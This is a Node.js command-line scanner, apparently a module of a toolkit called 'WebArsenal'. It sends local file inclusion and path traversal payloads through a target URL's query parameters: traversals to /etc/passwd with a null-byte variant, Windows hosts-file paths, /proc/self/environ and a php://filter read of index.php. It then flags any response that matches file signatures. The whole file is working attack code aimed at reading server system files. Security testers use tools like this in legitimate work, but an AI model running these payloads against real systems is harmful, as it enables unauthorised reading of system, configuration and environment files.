#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: lfi-path-traversal.js                              ║
 * ║  Category: analyzers                                            ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const axios = require('axios');

program
  .name('lfi-path-traversal.js')
  .description('Tests for Local File Inclusion and Path Traversal vulnerabilities.')
  .version('3.0.0')
  .requiredOption('-u, --url <url>', 'Target URL with parameters (e.g. https://example.com/api?file=test)')
  .option('-p, --param <name>', 'Specific parameter to fuzz')
  .parse(process.argv);

const opts = program.opts();

const LFI_PAYLOADS = [
  "/etc/passwd",
  "../../../../etc/passwd",
  "../../../../../../../../etc/passwd",
  "../../../../etc/passwd%00",
  "C:\\Windows\\System32\\drivers\\etc\\hosts",
  "..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
  "php://filter/convert.base64-encode/resource=index.php",
  "/proc/self/environ"
];

const SIGNATURES = [
  "root:x:0:0:", // Linux
  "localhost", // Windows hosts
  "daemon:x:",
  "PD9waHAK" // Base64 for '<?php'
];

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'lfi-path-traversal.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const targetUrl = new URL(opts.url);
  const params = opts.param ? [opts.param] : Array.from(targetUrl.searchParams.keys());
  
  if (params.length === 0) {
    console.log(chalk.yellow('[!] No parameters found. Use -u <url?file=test>'));
    return;
  }
  
  for (const param of params) {
    console.log(chalk.cyan(`[*] Fuzzing [LFI/Path Traversal] for: ${param}`));
    for (const payload of LFI_PAYLOADS) {
      const testUrl = new URL(targetUrl.href);
      testUrl.searchParams.set(param, payload);
      
      try {
        const res = await axios.get(testUrl.href, { timeout: 5000, validateStatus: () => true });
        const body = String(res.data);
        
        const foundSig = SIGNATURES.find(sig => body.includes(sig));
        
        if (foundSig) {
           console.log(chalk.bold.red(`\n[!] LFI VULNERABILITY DETECTED! [${param}]`));
           console.log(chalk.red(`    Payload: ${payload}`));
           console.log(chalk.red(`    Signature Match: ${foundSig}`));
           console.log(chalk.red(`    URL: ${testUrl.href}\n`));
           break;
        }
      } catch (e) {}
    }
  }
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
